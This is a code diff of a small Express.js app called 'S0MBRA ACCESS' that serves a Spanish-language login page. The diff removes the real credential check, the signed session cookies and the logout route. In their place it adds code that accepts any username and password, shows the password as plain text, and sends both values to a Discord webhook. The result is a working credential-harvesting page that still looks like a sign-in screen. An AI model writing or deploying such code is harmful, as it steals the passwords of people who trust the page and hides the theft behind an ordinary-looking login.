@@ -1,5 +1,4 @@
 import express from "express";
-import crypto from "crypto";
 
 const app = express();
 
@@ -7,93 +6,17 @@ app.use(express.json());
 
 const PORT = process.env.PORT || 3000;
 const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
-const SESSION_SECRET = process.env.SESSION_SECRET;
 
-if (!SESSION_SECRET) {
-  console.error("❌ Falta SESSION_SECRET en las variables de entorno");
-  process.exit(1);
-}
-
-/*
-  Crear una cookie de sesión firmada.
-*/
-function createSession(username) {
-  const payload = Buffer.from(
-    JSON.stringify({
-      username,
-      createdAt: Date.now()
-    })
-  ).toString("base64url");
-
-  const signature = crypto
-    .createHmac("sha256", SESSION_SECRET)
-    .update(payload)
-    .digest("base64url");
-
-  return `${payload}.${signature}`;
-}
-
-/*
-  Leer y verificar la cookie.
-*/
-function getSession(req) {
-  const cookies = req.headers.cookie || "";
-
-  const match = cookies.match(/s0mbra_session=([^;]+)/);
-
-  if (!match) {
-    return null;
-  }
-
-  const token = match[1];
-  const [payload, signature] = token.split(".");
-
-  if (!payload || !signature) {
-    return null;
-  }
-
-  const expectedSignature = crypto
-    .createHmac("sha256", SESSION_SECRET)
-    .update(payload)
-    .digest("base64url");
-
-  const valid = crypto.timingSafeEqual(
-    Buffer.from(signature),
-    Buffer.from(expectedSignature)
-  );
-
-  if (!valid) {
-    return null;
-  }
-
-  try {
-    const data = JSON.parse(
-      Buffer.from(payload, "base64url").toString()
-    );
-
-    return data;
-  } catch {
-    return null;
-  }
-}
-
-
-/*
-  Página principal
-*/
 app.get("/", (req, res) => {
   res.send(`
 <!DOCTYPE html>
 <html lang="es">
-
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>S0MBRA ACCESS</title>
 
 <style>
-
 * {
   box-sizing: border-box;
 }
@@ -117,6 +40,7 @@ body {
   border: 1px solid #292929;
   border-radius: 18px;
   text-align: center;
+  box-shadow: 0 0 30px rgba(255,255,255,0.05);
 }
 
 .logo {
@@ -146,6 +70,10 @@ input {
   font-size: 16px;
 }
 
+input:focus {
+  border-color: #777;
+}
+
 button {
   width: 100%;
   margin-top: 20px;
@@ -164,7 +92,6 @@ button {
   min-height: 22px;
   color: #aaa;
 }
-
 </style>
 </head>
 
@@ -172,52 +99,45 @@ button {
 
 <div class="container">
 
-<div class="logo">S0MBRA</div>
+  <div class="logo">S0MBRA</div>
 
-<label class="label">USUARIO</label>
+  <label class="label">USUARIO</label>
 
-<input
-  id="usuario"
-  type="text"
-  placeholder="Ingresá tu usuario"
-  autocomplete="username"
->
+  <input
+    id="usuario"
+    type="text"
+    placeholder="Ingresá tu usuario"
+    autocomplete="off"
+  >
 
-<label class="label">CLAVE</label>
+  <label class="label">CLAVE</label>
 
-<input
-  id="clave"
-  type="password"
-  placeholder="Ingresá clave"
-  autocomplete="current-password"
->
+  <input
+    id="clave"
+    type="text"
+    placeholder="Ingresá clave"
+    autocomplete="off"
+  >
 
-<button onclick="access()">ENTRAR</button>
+  <button onclick="access()">ENTRAR</button>
 
-<div id="status"></div>
+  <div id="status"></div>
 
 </div>
 
 <script>
-
 async function access() {
 
-  const usuario =
-    document.getElementById("usuario").value.trim();
-
-  const clave =
-    document.getElementById("clave").value;
-
-  const status =
-    document.getElementById("status");
+  const usuario = document.getElementById("usuario").value.trim();
+  const clave = document.getElementById("clave").value.trim();
+  const status = document.getElementById("status");
 
   if (!usuario || !clave) {
-    status.textContent =
-      "⚠️ Completá los dos campos";
+    status.textContent = "⚠️ Completá los dos campos";
     return;
   }
 
-  status.textContent = "⏳ Verificando...";
+  status.textContent = "⏳ Enviando...";
 
   try {
 
@@ -227,8 +147,8 @@ async function access() {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        usuario,
-        clave
+        usuario: usuario,
+        clave: clave
       })
     });
 
@@ -236,28 +156,22 @@ async function access() {
 
     if (data.success) {
 
-      document.getElementById("clave").value = "";
-
       status.textContent =
-        "✅ Sesión iniciada como " + usuario;
+        "✅ Usuario: " + usuario +
+        " | CLAVE: " + clave;
 
     } else {
 
-      status.textContent =
-        "❌ " + data.message;
+      status.textContent = "❌ " + data.message;
 
     }
 
   } catch (error) {
 
-    console.error(error);
-
-    status.textContent =
-      "❌ Error de conexión";
+    status.textContent = "❌ Error de conexión";
 
   }
 }
-
 </script>
 
 </body>
@@ -265,129 +179,67 @@ async function access() {
   `);
 });
 
-
-/*
-  LOGIN
-*/
 app.post("/access", async (req, res) => {
 
   try {
 
-    const usuario =
-      String(req.body?.usuario || "").trim();
-
-    const clave =
-      String(req.body?.clave || "");
+    const usuario = String(req.body?.usuario || "").trim();
+    const clave = String(req.body?.clave || "").trim();
 
     if (!usuario || !clave) {
-
       return res.status(400).json({
         success: false,
         message: "Completá los dos campos"
       });
-
     }
 
-    const demoUser =
-      process.env.DEMO_USER;
-
-    const demoPassword =
-      process.env.DEMO_PASSWORD;
-
-    if (!demoUser || !demoPassword) {
-
+    if (!DISCORD_WEBHOOK) {
       return res.status(500).json({
         success: false,
-        message: "Credenciales no configuradas"
+        message: "Webhook no configurado"
       });
-
     }
 
-    /*
-      Comprobar credenciales.
-    */
-    if (
-      usuario !== demoUser ||
-      clave !== demoPassword
-    ) {
+    await fetch(DISCORD_WEBHOOK, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        username: "S0MBRA ACCESS",
+        embeds: [
+          {
+            title: "🔐 Nuevo registro de prueba",
+            fields: [
+              {
+                name: "👤 Usuario",
+                value: usuario
+              },
+              {
+                name: "🔑 CLAVE",
+                value: clave
+              },
+              {
+                name: "Estado",
+                value: "🟢 RECIBIDO"
+              }
+            ],
+            timestamp: new Date().toISOString()
+          }
+        ]
+      })
+    });
 
-      return res.status(401).json({
-        success: false,
-        message: "Usuario o clave incorrectos"
-      });
-
-    }
-
-    /*
-      Crear sesión.
-    */
-    const sessionToken =
-      createSession(usuario);
-
-    res.setHeader(
-      "Set-Cookie",
-      `s0mbra_session=${sessionToken}; HttpOnly; Path=/; SameSite=Lax; Max-Age=86400`
-    );
-
-    /*
-      Aviso a Discord.
-      NO enviamos la contraseña.
-    */
-    if (DISCORD_WEBHOOK) {
-
-      await fetch(DISCORD_WEBHOOK, {
-
-        method: "POST",
-
-        headers: {
-          "Content-Type": "application/json"
-        },
-
-        body: JSON.stringify({
-
-          username: "S0MBRA ACCESS",
-
-          embeds: [
-
-            {
-              title: "🔐 Inicio de sesión",
-
-              fields: [
-
-                {
-                  name: "👤 Usuario",
-                  value: usuario
-                },
-
-                {
-                  name: "Estado",
-                  value: "🟢 AUTENTICADO"
-                }
-
-              ],
-
-              timestamp:
-                new Date().toISOString()
-            }
-
-          ]
-
-        })
-
-      });
-
-    }
-
-    return res.json({
+    res.json({
       success: true,
-      message: "Sesión iniciada"
+      message: "Datos recibidos"
     });
 
   } catch (error) {
 
     console.error(error);
 
-    return res.status(500).json({
+    res.status(500).json({
       success: false,
       message: "Error interno"
     });
@@ -396,53 +248,6 @@ app.post("/access", async (req, res) => {
 
 });
 
-
-/*
-  Ver sesión.
-*/
-app.get("/me", (req, res) => {
-
-  const session = getSession(req);
-
-  if (!session) {
-
-    return res.status(401).json({
-      success: false,
-      message: "No hay una sesión activa"
-    });
-
-  }
-
-  res.json({
-    success: true,
-    user: session.username
-  });
-
-});
-
-
-/*
-  Cerrar sesión.
-*/
-app.post("/logout", (req, res) => {
-
-  res.setHeader(
-    "Set-Cookie",
-    "s0mbra_session=; HttpOnly; Path=/; SameSite=Lax; Max-Age=0"
-  );
-
-  res.json({
-    success: true,
-    message: "Sesión cerrada"
-  });
-
-});
-
-
 app.listen(PORT, "0.0.0.0", () => {
-
-  console.log(
-    `S0MBRA Access funcionando en puerto ${PORT}`
-  );
-
+  console.log(`S0MBRA Access funcionando en puerto ${PORT}`);
 });
